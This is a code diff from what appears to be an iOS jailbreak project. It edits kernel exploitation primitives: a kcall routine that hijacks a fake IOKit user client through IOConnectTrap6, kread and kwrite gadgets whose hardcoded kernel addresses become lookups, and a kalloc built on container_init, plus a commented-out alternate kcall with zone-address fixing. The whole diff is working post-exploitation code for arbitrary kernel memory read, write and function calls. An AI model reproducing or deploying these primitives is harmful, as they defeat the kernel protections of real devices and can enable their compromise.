@@ -44,7 +44,32 @@ uint64_t get_kernel_slide() {
 //     x2 = x0;             // MOV X0, X2
 //     return IOConnectTrap6(user_client, 0, x1, x2, x3, x4, x5, x6);
 // }
+/*
+ uint64_t zm_fix_addr_kalloc(uint64_t addr) {
+   // se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;
+   // XXX guess what is that address xD
+   uint64_t kmem = off_zm_fix_addr_kalloc + get_kslide();
+   uint64_t zm_alloc = kread64(kmem); // idk?
+   uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;
 
+   return (zm_stripped | ((addr)&0xffffffff));
+ }
+
+ uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2,
+                uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
+   uint64_t offx20 = kread64(_fake_client + 0x40);
+   uint64_t offx28 = kread64(_fake_client + 0x48);
+   kwrite64(_fake_client + 0x40, x0);
+   kwrite64(_fake_client + 0x48, addr);
+   uint64_t returnval = IOConnectTrap6(
+       _user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3),
+       (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+   kwrite64(_fake_client + 0x40, offx20);
+   kwrite64(_fake_client + 0x48, offx28);
+   return returnval;
+ }
+ 
+ */
 uint64_t kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5) {
     if (@available(iOS 16, *)) {
         // mov x0, x3
@@ -69,7 +94,7 @@ uint32_t kread32(uint64_t addr) {
         return (uint32_t)kcall(kernel_info.kernel_functions.kread_gadget, addr, 0, 0, 0, 0, 0);
     }
 
-    return (uint32_t)kcall(0xFFFFFFF009446D08 + get_kernel_slide(), 0, addr, 0, 0, 0, 0);
+    return (uint32_t)kcall(kernel_info.kernel_functions.kread_gadget, 0, addr, 0, 0, 0, 0);
 }
 
 uint8_t kread8(uint64_t addr) {
@@ -98,16 +123,21 @@ void kread_string(uint64_t addr, char *out) {
 
 uint64_t kalloc(size_t ksize) {
     // kalloc slightly more
-   // uint64_t r = kcall(kernel_info.kernel_functions.container_init, kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
     JBLogDebug("[+] Attempting KALLOC");
     JBLogDebug("[+] kernel_info.fake_userclient: 0x%x", kernel_info.fake_userclient);
     JBLogDebug("[+] off_empty_kdata_page + slide: 0x%llx", off_empty_kdata_page + kernel_info.kslide);
     JBLogDebug("[+] off_empty_kdata_page - slide: 0x%llx", off_empty_kdata_page - kernel_info.kslide);
     JBLogDebug("[+] off_empty_kdata_page: 0x%llx", off_empty_kdata_page);
     JBLogDebug("[+] kernel_info.kernel_functions.container_init: 0x%llx", kernel_info.kernel_functions.container_init);
+//
+     uint64_t r = kcall(kernel_info.kernel_functions.container_init, kernel_info.fake_userclient + 0x200, ksize / 8 + 8, 0, 0, 0, 0);
+ //   uint64_t r = kcall(kernel_info.kernel_functions.container_init, off_empty_kdata_page + kernel_info.kslide + 0x200, ksize / 8, 0, 0, 0, 0);
+  //  uint64_t r = kcall(off_kalloc_data_external + kernel_info.kslide, ksize, 1, 0, 0, 0, 0);
+//    allocated_kmem = zm_fix_addr_kalloc(allocated_kmem);
+  //  term_kcall();
+    //return allocated_kmem;
 
-    uint64_t r = kcall(kernel_info.kernel_functions.container_init, off_empty_kdata_page + kernel_info.kslide + 0x200, ksize / 8, 0, 0, 0, 0);
-
+    
     if (r == 0) return 0;
     JBLogDebug("[+] r not 0");
 
@@ -126,7 +156,7 @@ void kwrite64(uint64_t addr, uint64_t data) {
         return;
     }
 
-    kcall(0xFFFFFFF007BADBB8 + get_kernel_slide(), addr, data, addr, 0, 0, 0);
+    kcall(kernel_info.kernel_functions.kwrite_gadget, addr, data, addr, 0, 0, 0);
 }
 
 void kwrite32(uint64_t addr, uint32_t data) {
